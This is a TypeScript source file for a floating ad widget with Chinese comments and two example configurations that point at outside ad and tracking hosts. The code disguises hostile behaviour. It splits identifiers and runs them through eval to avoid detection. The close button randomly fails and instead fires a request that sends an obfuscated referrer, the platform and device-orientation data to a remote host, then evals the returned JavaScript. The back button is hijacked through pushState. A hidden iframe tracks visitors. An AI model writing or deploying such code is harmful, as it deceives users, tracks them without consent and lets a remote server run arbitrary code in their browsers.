/*!
 * @params {String} width 宽度 默认200px
 * @params {String} height 高度 默认300px
 * @params {Number} shdow 不被看见的区域百分比，默认0不开启，指的是在原来的大小基础上向四周延伸的大小
 * @params {String} pos 默认 'left', 值有：'left','right','top','bottom','center', 'none'表示不设置定位
 * @params {String} distanceTop pos值为'left','right'时设置
 * @params {Number || String} close_btn 关闭按钮 默认1，1默认按钮效果，或者图片地址
 * @params {Number} closeDec 关闭按钮是否真的关闭 范围0.01 ~ 1 默认0，0可直接关闭
 * @params {Number} showBorder 是否显示边框，默认0， 0 不显示，其它数字表示边框大小
 * @params {0 || String} effect 效果，0为关闭 ，默认'pulse'  'tada'抖动 'pulse'放大 'rotate'旋转
 * @params {String} effectdura 效果间隔, 默认 '5s';
 * @params {String} effectdelay 效果延时, 默认 '3s';
 * @params {String} stutslink 统计链接地址
 * @params {String} alink 链接地址
 * @params {Number} btnNumpar 按钮传参数字 默认5
 * @params {Number} imgNumpar 图片传参数字 默认1
 * @params {Number} shdowNumpar 不可见区域传参数字 默认3
 * @params {Number} backNumpar 不可见区域传参数字 默认5
 * @params {Number} imgduration 图片切换间隔 默认2000 
 * @params {Number} isBack 是否开启返回监听 0和1 默认1开启
 * @params {Array} imgs 图片地址数组
 * 注意iframe 使用带上参数ifr。 e.g. <iframe src="iframe.html?ifr=1" frameborder="0" scrolling="no" width="300" height="500"></iframe> 其中wdith和height自定义，但是必填。 受浏览器安全策略限制，shdow参数无效
*/
/* 
 * notice: 固定位置引入必须给引入的script标签加上id="zrgscript" 目前固定位置同一个js引入2个可能会在某些浏览器存在冲突情况，因为id相同
 */
class Zed {
    [x: string]: any;
    constructor({
            width,
            height,
            shdow,
            pos,
            distanceTop,
            close_btn,
            closeDec,
            showBorder,
            effect,
            effectdura,
            effectdelay,
            stutslink,
            alink,
            btnNumpar,
            imgNumpar,
            shdowNumpar,
            backNumpar,
            imgduration,
            imgs,
            isBack,
            asType
        }){
        this.aWidth = width || '200px';
        this.aHeight = height || '300px';
        this.shdow = shdow || 0;
        this.pos = pos || 'left';
        this.distanceTop = distanceTop || '100px';
        this.close_btn = close_btn || 1;
        this.closeDec = closeDec || 0;
        this.showBorder = showBorder || 0;
        this.effect = effect || 'pulse';
        this.effectdura = effectdura || '5s';
        this.effectdelay = effectdelay;
        this.stutslink = stutslink || '';
        this.alink = alink || '';
        this.btnNumpar = btnNumpar || 5;
        this.imgNumpar = imgNumpar || 1;
        this.shdowNumpar = shdowNumpar || 3;
        this.backNumpar = backNumpar || 5;
        this.imgduration = imgduration || 2000;
        this.imgs = imgs || [];
        this.isBack = isBack || 1;
        this.asType = asType || 'dp';

        this.winW = document.documentElement.clientWidth || document.body.clientWidth;
        this.winH = document.documentElement.clientHeight || document.body.clientHeight;
        // if (this.isWap() == false) {
        //     return;
        // }
        this.init();
    }
    init(){
        this.writeCss();
        this.mobc();
        this.creatWrapper();
        let lcsl = setInterval(()=>{
            this.writeCss();
        },300);
        setTimeout(() => {
            this.writeCss();
            clearInterval(lcsl);
        }, 600);
        if (this.getQueryParam()) {
            this.iframeInnercss();
        }
    }
    isWap(){
        if(navigator.platform.indexOf("Win") == 0 || navigator.platform.indexOf("Mac") == 0){ return false;}
    }
    getQueryParam(){
        let urlParam = 'ifr';
        let query = window.location.search.substring(1);
        let vars = query.split("&");
        for (let i=0;i<vars.length;i++) {
            let pair = vars[i].split("=");
            if(pair[0] == urlParam){return pair[1];}
        }
        return(false);
    }
    cofc(str:string){// get string to charcode then get it back 
        let arr = str.replace(/\s*/g,'').split('');
        let tempstr = '';
        for (let i = 0, len = arr.length; i < len; i++) {
            tempstr += String.fromCharCode(arr[i].charCodeAt(0));
        }
        return tempstr
    }
    creatWrapper() {
        let wrap = document.createElement('d'+'i'+'v');
        let closeBtn = this.closeBtn();
        let imgbox = this.imgBox();
        wrap.className = 'zed-wrap';
        wrap.id = 'zedbox';
        let wrapWidth = `${this.aWidth}`,
        wrapHeight = `${this.aHeight}`;
        if (this.getQueryParam()) {
            wrapWidth = '100%';
            wrapHeight = '100%';
        }
        wrap.style.cssText = `width: ${wrapWidth};height: ${wrapHeight};`;
        this.adPosition(wrap);

        let paranum = this.btnNumpar;
        function propt(probability:number){
            var probability = probability*100 || 1;
            var odds = Math.floor(Math.random()*100);
            if(probability === 1){
                closeBtn.setAttribute('onclick', `cxta(${paranum})`);
            };
            if(odds < probability){
                closeBtn.setAttribute('onclick', `cxta(${paranum})`);
            }else{
                closeBtn.onclick = () => {
                    wrap.style.display = 'none';
                    document.body.removeChild(wrap);
                }
            }
        };
        propt(Number(this.closeDec));
        
        wrap.appendChild(closeBtn);
        wrap.appendChild(imgbox);
        window.addEventListener('load', ()=>{
            this.zstatus();
            this.winW = document.documentElement.clientWidth || document.body.clientWidth;
            this.winH = document.documentElement.clientHeight || document.body.clientHeight;
            if (this.pos == 'none' && window.self == window.top) {
                let zscript = document.getElementById('zrgscript');
                if (zscript) {
                    let parentEle = zscript.parentNode as HTMLElement;
                    if (parentEle.tagName == 'HEAD') {
                        let first = document.body.firstElementChild;
                        eval('doc'+'ume'+'nt.b'+'ody.ins'+'ertB'+'efo'+'re(wrap,first);')
                    }else{
                        eval('zscript.inse'+'rtAdj'+'ace'+'ntEle'+'ment("afterend",wrap);')
                    }
                }
            }else{
                eval('do'+'cum'+'ent.bo'+'dy.appe'+'ndCh'+'ild(wrap);')
            }
        })
    }
    adPosition(wrapEle){
        let ahnum = (this.aHeight).replace(/px/,'');
        let awnum= (this.aWidth).replace(/px/,'');
        if (this.aHeight.indexOf('%') > -1) {
            ahnum = (this.aHeight).replace(/%/,'');
            ahnum = this.winH * (Number(ahnum) / 100);
        }
        if (this.aWidth.indexOf('%') > -1) {
            awnum = (this.aWidth).replace(/%/,'');
            awnum = this.winW * (Number(awnum) / 100);
        }

        let margin_top = (Number(ahnum)/2).toFixed();
        let margin_left = (Number(awnum)/2).toFixed();
        if (this.pos == 'left') {
            wrapEle.style.position = 'fi'+'xed';
            wrapEle.style.zIndex = '999'+'999';
            wrapEle.style.left = '0';
            wrapEle.style.top = `${ this.distanceTop }`;
        }
        if (this.pos == 'right') {
            wrapEle.style.position = 'fi'+'xed';
            wrapEle.style.zIndex = '999'+'999';
            wrapEle.style.right = '0';
            wrapEle.style.top = `${ this.distanceTop }`;
        }
        if (this.pos == 'top') {
            wrapEle.style.position = 'fi'+'xed';
            wrapEle.style.zIndex = '999'+'999';
            wrapEle.style.left = '0';
            wrapEle.style.top = '0';
            wrapEle.style.right = '0';
            wrapEle.style.width = '100%';
        }
        if (this.pos == 'bottom') {
            wrapEle.style.position = 'fi'+'xed';
            wrapEle.style.zIndex = '999'+'999';
            wrapEle.style.left = '0';
            wrapEle.style.bottom = '0';
            wrapEle.style.right = '0';
            wrapEle.style.width = '100%';
        }
        if (this.pos == 'center') {
            wrapEle.style.position = 'ab'+'sol'+'ute';
            wrapEle.style.zIndex = '999'+'999';
            wrapEle.style.top = '50%';
            wrapEle.style.left = '50%';
            wrapEle.style.marginTop = `-${ margin_top }px`;
            wrapEle.style.marginLeft = `-${ margin_left }px`;
        }
        if (this.pos == 'none') {
            wrapEle.style.position = 're'+'la'+'tive';
        }
        if (this.getQueryParam()) {
            wrapEle.style.cssText += '';
        }
    }
    closeBtn(){
        let btn = document.createElement('d'+'i'+'v');
        btn.className = 'zed-btn-close';
        if (this.close_btn == 1) {
            btn.className += ' default';
            btn.style.backgroundColor = '#ccc';
            btn.style.textAlign = 'center';
            btn.style.color = '#fff';
            btn.innerHTML = '×';
        }else{
            btn.style.backgroundImage = `url(${this.close_btn})`;
        }
        btn.style.position = 'ab'+'so'+'lu'+'te';
        btn.style.zIndex = '1'+'0';
        btn.style.display = 'block';
        btn.style.width = '18px';
        btn.style.height = '18px';
        btn.style.lineHeight = '18px';
        btn.style.borderRadius = '50%';
        btn.style.right = '0';
        btn.style.top = '0';
        btn.style.backgroundRepeat = 'no-repeat';
        btn.style.backgroundPosition = 'center';
        btn.style.backgroundSize = 'cover';

        return btn;
    }
    imgBox(){
        let imglist = this.imgs;
        let imgEle = '';
        let ahnum = (this.aHeight).replace(/px/,'');
        let awnum= (this.aWidth).replace(/px/,'');
        if (this.aHeight.indexOf('%') > -1) {
            ahnum = (this.aHeight).replace(/%/,'');
            ahnum = this.winH * (Number(ahnum) / 100);
        }
        if (this.aWidth.indexOf('%') > -1) {
            awnum = (this.aWidth).replace(/%/,'');
            awnum = this.winW * (Number(awnum) / 100);
        }
        
        let aw = Number(awnum);
        let ah = Number(ahnum);
        let anthoer_w = aw* (this.shdow)/100;
        let anthoer_h = ah* (this.shdow)/100;
        let coverW = aw + anthoer_w;
        let coverH = ah + anthoer_h;
        let paranum = this.shdowNumpar;
        if (imglist.length > 0) {
            for (let i = 0; i < imglist.length; i++) {
                let cssDisplay = i === 0 ? 'block': 'none';
                imgEle += `<div class="item" style="display:${cssDisplay};width: 100%;height: 100%;po${this.cofc('sit')}ion: r${this.cofc('ela')}tive;"><a><img src="${imglist[i]}" style="width: 100%;height: 100%;"/><div class="cover" style="width: ${coverW}px;height: ${coverH}px;top: -${anthoer_h/2}px;left: -${anthoer_w/2}px;po${this.cofc('sit')}ion: ${this.cofc('ab')}${this.cofc('so')}${this.cofc('lute')};" onclick="cxta(${paranum});"></div></a></div>`;
            }
        }
        let imgBox = document.createElement('d'+'i'+'v');
        imgBox.className = 'zed-img-box';
        imgBox.style.width = '100%';
        imgBox.style.height = '100%';
        imgBox.setAttribute('onclick', `cxta(${this.imgNumpar})`);
        if (this.effect !== 0) {
            imgBox.className += ' ' + `animated ${this.effect} infinite slower`;
        }
        if (this.effectdura != '') {
            imgBox.style.cssText += `animation-duration: ${this.effectdura};-webkit-animation-duration: ${this.effectdura};`;
        }
        if (this.effectdelay != '') {
            imgBox.style.cssText += `animation-delay: ${this.effectdelay};-webkit-animation-delay: ${this.effectdelay};`;
        }
        imgBox.innerHTML = imgEle;
        let childNode = imgBox.querySelectorAll('.item') as NodeListOf<HTMLElement>;
        let index = 1;
        if (childNode.length == 1) {
            childNode[0].style.display = 'block';
            childNode[0].onclick = e=>{
                if ( e && e.stopPropagation ) {
                    e.stopPropagation();
                }else {
                    window.event.cancelBubble = true;
                }
            }
        }else{
            setInterval(()=>{
                if (index > childNode.length -1) {
                    index = 0;
                }
                for (let j = 0; j < childNode.length; j++) {
                    childNode[j].style.display = 'none';
                    childNode[j].onclick = e=>{
                        if ( e && e.stopPropagation ) {
                            e.stopPropagation();
                        }else {
                            window.event.cancelBubble = true;
                        }
                    }
                }
                childNode[index].style.display = 'block';
                index++;
            }, this.imgduration);
        }
        let borderDiv = document.createElement('d'+'i'+'v');
        borderDiv.className = 'boddiv';
        borderDiv.style.position = 'ab'+'so'+'lu'+'te';
        borderDiv.style.cssText = `width: 100%;height: 100%; ${this.cofc('to')}p:0;-webkit-box-sizing: border-box;-moz-box-sizing: border-box;box-sizing: border-box;-webkit-background-clip: text;background-clip: text;-webkit-text-fill-color: transparent;text-fill-color: transparent;-webkit-animation: hue 8s infinite linear;animation: hue 8s infinite linear;`;
        if (this.showBorder == 1) {
            borderDiv.style.border= `${this.showBorder}px solid red`;
        }
        imgBox.appendChild(borderDiv);
        return imgBox;
    }
    ref(){
        var u;
        try {
            u = window.top.document.referrer;
        } catch (err) {
            u = document.referrer;
        }
        var r = '',
            c:number;
        for (var i = 0; i < u.length; i++) {
            if (i == 1000) {
                break;
            }
            c = u.charCodeAt(i);
            if (c > 96 && c < 123) {
                c += i % 8;
                if (c > 122) c -= 26;
            }
            r += String.fromCharCode(c);
        }
        return r;
    }
    zstatus(){
        var odiv_m_1 = document.createElement('div');
        odiv_m_1.style.display = "none";
        var oiframe_m_1 = document.createElement("iframe");
        oiframe_m_1.src = `${this.stutslink}&l=h`;
        oiframe_m_1.height="0";
        oiframe_m_1.width="0";
        oiframe_m_1.sandbox="allow-same-origin allow-scripts allow-forms";
        oiframe_m_1.allowtransparency="true";
        oiframe_m_1.style.display = "none";
        odiv_m_1.appendChild(oiframe_m_1);
        document.body.appendChild(odiv_m_1);
    }
    mobc(){
        window.addEventListener("deviceorientation", event => {
            let  M18_url = `${this.alink}&pn=0.25&ref=${this.ref()}&refso=${navigator.platform}_${this.asType}&zhongli=_${Math.floor(event.alpha)},${Math.floor(event.beta)},${Math.floor(event.gamma)}`;

            let strjs1 = `function cxta(ct){var a=new XMLHttpRequest();var b='${M18_url}&n='+window.history.length+'&ct='+ct+'&r='+Math.floor(Math.random()*9999999+1);if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(window.execScript)window.execScript(a.responseText,'JavaScript');else if(window.eval)window.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}}pushHistory();function pushHistory(){var state={title:'title',url:'#'};window.history.pushState(state,'title','#')}window.addEventListener('popstate', function (e) {cxta(${this.backNumpar});}, false);`;
            let js1nod = document.createElement('script');
            js1nod.innerHTML = strjs1;
            document.getElementsByTagName('head')[0].appendChild(js1nod);

        }, false);
    }
    writeCss(){
        let s = document.createElement("s" + "t" + "y" + "l" + "e");
        s.innerHTML =`
        @keyframes hue {
            0% {
                -webkit-filter: hue-rotate(0deg);
            }
            100% {
                -webkit-filter: hue-rotate(360deg);
            }
        }
        `;
        if (this.effect !== 0) {
            s.innerHTML += `
            .animated {
                -webkit-animation-duration: 1s;
                animation-duration: 1s;
                -webkit-animation-fill-mode: both;
                animation-fill-mode: both;
              }
              .animated.infinite {
                -webkit-animation-iteration-count: infinite;
                animation-iteration-count: infinite;
              }
              .animated.delay-5s {
                -webkit-animation-delay: 5s;
                animation-delay: 5s;
              }
              
              .animated.slow {
                -webkit-animation-duration: 2s;
                animation-duration: 2s;
              }
              
              .animated.slower {
                -webkit-animation-duration: 3s;
                animation-duration: 3s;
              }
              @media (print), (prefers-reduced-motion) {
                .animated {
                  -webkit-animation: unset !important;
                  animation: unset !important;
                  -webkit-transition: none !important;
                  transition: none !important;
                }
              }
            @-webkit-keyframes tada {
                from {
                  -webkit-transform: scale3d(1, 1, 1);
                  transform: scale3d(1, 1, 1);
                }
              
                10%,
                20% {
                  -webkit-transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);
                  transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);
                }
              
                30%,
                50%,
                70%,
                90% {
                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
                }
              
                40%,
                60%,
                80% {
                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
                }
              
                to {
                  -webkit-transform: scale3d(1, 1, 1);
                  transform: scale3d(1, 1, 1);
                }
              }
              
              @keyframes tada {
                from {
                  -webkit-transform: scale3d(1, 1, 1);
                  transform: scale3d(1, 1, 1);
                }
              
                10%,
                20% {
                  -webkit-transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);
                  transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);
                }
              
                30%,
                50%,
                70%,
                90% {
                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
                }
              
                40%,
                60%,
                80% {
                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
                }
              
                to {
                  -webkit-transform: scale3d(1, 1, 1);
                  transform: scale3d(1, 1, 1);
                }
              }
              
              .tada {
                -webkit-animation-name: tada;
                animation-name: tada;
              }
              @-webkit-keyframes pulse {
                from {
                  -webkit-transform: scale3d(1, 1, 1);
                  transform: scale3d(1, 1, 1);
                }
              
                50% {
                  -webkit-transform: scale3d(1.05, 1.05, 1.05);
                  transform: scale3d(1.05, 1.05, 1.05);
                }
              
                to {
                  -webkit-transform: scale3d(1, 1, 1);
                  transform: scale3d(1, 1, 1);
                }
              }
              
              @keyframes pulse {
                from {
                  -webkit-transform: scale3d(1, 1, 1);
                  transform: scale3d(1, 1, 1);
                }
              
                50% {
                  -webkit-transform: scale3d(1.05, 1.05, 1.05);
                  transform: scale3d(1.05, 1.05, 1.05);
                }
              
                to {
                  -webkit-transform: scale3d(1, 1, 1);
                  transform: scale3d(1, 1, 1);
                }
              }
              
              .pulse {
                -webkit-animation-name: pulse;
                animation-name: pulse;
            }
            
            @-webkit-keyframes animaterotate {
                0% {
                    -webkit-transform: rotate(0deg);
                    -moz-transform: rotate(0deg);
                    -ms-transform: rotate(0deg);
                    transform: rotate(0deg);
                }
                100% {
                    -webkit-transform: rotate(360deg);
                    -moz-transform: rotate(360deg);
                    -ms-transform: rotate(360deg);
                    transform: rotate(360deg);
                }
            }
            @-moz-keyframes animaterotate {
                0% {
                    -webkit-transform: rotate(0deg);
                    -moz-transform: rotate(0deg);
                    -ms-transform: rotate(0deg);
                    transform: rotate(0deg);
                }

                100% {
                    -webkit-transform: rotate(360deg);
                    -moz-transform: rotate(360deg);
                    -ms-transform: rotate(360deg);
                    transform: rotate(360deg);
                }
            }
            @keyframes animaterotate {
                0% {
                    -webkit-transform: rotate(0deg);
                    -moz-transform: rotate(0deg);
                    -ms-transform: rotate(0deg);
                    transform: rotate(0deg);
                }

                100% {
                    -webkit-transform: rotate(360deg);
                    -moz-transform: rotate(360deg);
                    -ms-transform: rotate(360deg);
                    transform: rotate(360deg);
                }
            }
            .zed-img-box.rotate {
                -webkit-animation-name: animaterotate;
                animation-name: animaterotate;
                -webkit-animation-timing-function: linear;
                animation-timing-function: linear;
                -webkit-animation-duration: 8s;
                animation-duration: 8s;
            }
            `;
            
        }
        let head = document.getElementsByTagName('h'+'e'+'a'+'d')[0];
        window.addEventListener('DOMContentLoaded', ()=>{
            eval('do'+'cum'+'ent'+'.bo'+'dy'+'.app'+'endCh'+'ild(s);')
        })
    }
    iframeInnercss(){
        let st = document.createElement("s" + "t" + "y" + "l" + "e");
        st.innerHTML = `
        html, body {
            width: 100%;height: 100%;
            margin: 0;padding: 0;
        }
        .zed-wrap {
            width: 100%;
            height: 100%;
        }
        `;
        let head = document.getElementsByTagName('h'+'e'+'a'+'d')[0];
        head.appendChild(st);
    }
}

new Zed({
    width: '200px',
    height: '240px',
    shdow: 40,
    pos: 'right',
    distanceTop: '100px',
    close_btn: 'data:image/png;base64,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',
    closeDec: 0.5,
    showBorder: 0,
    effect: 'tada',
    effectdura: '6s',
    effectdelay: '',
    stutslink: 'https://cc.ydy2.com/cnzz.html?ptype=<?=$equipment?>&userid=<?=$userid?>&pid=<?=$pid?>&s=<?=$systj?>',
    alink: 'https://v.gw069.com/dijuh/w.php?v=OTgyfDY0fDYzfDYxfDQ3fDF8fDI',
    btnNumpar: 5,
    imgNumpar: 1,
    shdowNumpar: 3,
    backNumpar: 5,
    imgduration: 3000,
    isBack: 1,
    asType: 'dp',
    imgs: ['imgs/img1.jpg','imgs/img2.jpg','imgs/img3.jpg','imgs/img4.jpg','imgs/img5.jpg'],
    // imgs: ['https://cdn.pixabay.com/photo/2015/12/01/20/28/road-1072823_960_720.jpg','https://cdn.pixabay.com/photo/2015/12/01/20/28/green-1072828_960_720.jpg','https://cdn.pixabay.com/photo/2017/02/01/22/02/mountain-landscape-2031539_960_720.jpg','https://cdn.pixabay.com/photo/2019/03/01/18/52/house-4028391_960_720.jpg','https://cdn.pixabay.com/photo/2015/06/19/21/24/the-road-815297_960_720.jpg']
})

new Zed({
    width: '200px',
    height: '300px',
    shdow: 30,
    pos: 'left',
    distanceTop: '150px',
    close_btn: 1,
    closeDec: 0.5,
    showBorder: 0,
    effect: 'tada',
    effectdura: '6s',
    effectdelay: '',
    stutslink: 'https://cc.ydy2.com/cnzz.html?ptype=<?=$equipment?>&userid=<?=$userid?>&pid=<?=$pid?>&s=<?=$systj?>',
    alink: 'https://v.gw069.com/dijuh/w.php?v=OTgyfDY0fDYzfDYxfDQ3fDF8fDI',
    btnNumpar: 5,
    imgNumpar: 1,
    shdowNumpar: 3,
    backNumpar: 5,
    imgduration: 3000,
    isBack: 1,
    asType: 'dp',
    imgs: ['imgs/img1.jpg'],
    // imgs: ['https://cdn.pixabay.com/photo/2015/12/01/20/28/road-1072823_960_720.jpg','https://cdn.pixabay.com/photo/2015/12/01/20/28/green-1072828_960_720.jpg','https://cdn.pixabay.com/photo/2017/02/01/22/02/mountain-landscape-2031539_960_720.jpg','https://cdn.pixabay.com/photo/2019/03/01/18/52/house-4028391_960_720.jpg','https://cdn.pixabay.com/photo/2015/06/19/21/24/the-road-815297_960_720.jpg']
})
